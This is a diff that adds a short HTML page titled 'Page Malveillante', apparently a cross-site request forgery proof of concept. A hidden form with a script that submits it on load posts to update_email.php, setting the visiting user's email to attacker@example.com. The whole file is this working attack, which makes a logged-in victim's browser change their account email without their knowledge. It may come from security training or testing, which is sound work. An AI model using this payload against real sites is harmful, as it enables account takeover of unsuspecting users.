@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Page Malveillante</title>
+</head>
+<body>
+    <h1>Page Malveillante</h1>
+    <form action="update_email.php" method="POST" id="csrfForm">
+        <input type="hidden" name="email" value="attacker@example.com">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
